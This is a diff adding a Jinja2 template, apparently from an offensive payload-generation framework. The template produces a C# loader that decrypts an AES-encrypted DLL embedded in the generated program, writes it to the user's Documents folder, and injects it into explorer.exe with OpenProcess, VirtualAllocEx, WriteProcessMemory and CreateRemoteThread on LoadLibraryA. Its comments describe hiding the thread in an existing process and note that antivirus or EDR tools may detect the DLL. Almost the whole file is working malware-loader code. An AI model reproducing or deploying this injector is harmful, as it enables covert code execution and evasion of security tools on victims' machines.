@@ -1,0 +1,62 @@
+{# load-dll.jinja #}
+{#
+    This Jinja2 template includes a C# console app that
+    load a decrypted dll to memory.
+
+    It also uses the OpenProcess() and CreateRemoteThread()
+    API calls to 'hide' the thread in a existing windows
+    process.
+
+    NOTICE: As the dll is written to disk in clear, it can
+    trigger AV/EDR detection and be flagged accordingly.
+#}
+using System;
+using System.Diagnostics;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Security.Cryptography;
+
+class Program
+{
+    {# Include hex string to byte array conversion function #}
+    {% include "csharp/transform/hexstr2bytearray.jinja" %}
+    {# Include AES decryption function #}
+    {% include "csharp/decrypt/aes-dotnet.jinja" %}
+
+    static void Main(string[] args)
+    {
+        string password = "{{ password }}";
+        int iterations = {{ iter }};
+        int keySize = {{ key_size }};
+
+        string salt = "{{ salt }}";
+        string iv = "{{ iv }}";
+        byte[] saltBytes = HexStringToByteArray(salt);
+        byte[] ivBytes = HexStringToByteArray(iv);
+
+        string ciphertext = "{{ ciphertext }}";
+        byte[] encryptedBytes = Convert.FromBase64String(ciphertext);
+
+        byte[] decryptedData;
+        decryptedData = DecryptAES(encryptedBytes, keySize, password, iterations, saltBytes, ivBytes);
+
+        String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        String dllPath = dir + "{{ iv }}.dll";
+
+        using (BinaryWriter binWriter = new BinaryWriter(File.Open(dllPath, FileMode.Create)))
+        {
+            binWriter.Write(decryptedData);
+        }
+
+        Process[] eProc = Process.GetProcessesByName("explorer");
+        int eppid = eProc[0].Id;
+        IntPtr hProcess = OpenProcess(0x001F0FFF, false, eppid);
+
+        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+        IntPtr outSize;
+        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), dllPath.Length, out outSize);
+        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+    }
+}
